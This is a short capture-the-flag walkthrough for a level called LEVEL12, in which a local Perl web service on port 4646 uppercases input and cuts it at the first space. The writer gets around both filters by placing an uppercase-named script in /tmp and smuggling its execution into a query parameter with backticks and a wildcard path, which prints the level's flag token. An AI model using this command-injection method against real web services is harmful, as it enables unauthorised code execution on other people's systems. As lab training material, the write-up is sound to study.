# LEVEL12

We can see there is a **level12.pl** pearl file. When we ```cat``` it we see there is a server runing on the port ```4646```.  It shows aswell 2 regex.
- 1st regex shows a switch from lowercase to uppercase
- 2nd regex shows delete the first space it encounters and everything after that.

Linux is case sensitive so we will have to create a script which has an uppercase name.

```
$> vim /tmp/SCRIPT12 
```
And write this script
```
#!/bin/sh
getflag > /tmp/flag12
```
Give the script 777 permission else it doesn't work.
```
chmod 777 /tmp/SCRIPT12
```
We will then curl our script : 
```
$> curl localhost:4646?x='`/*/SCRIPT12`'
$> cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
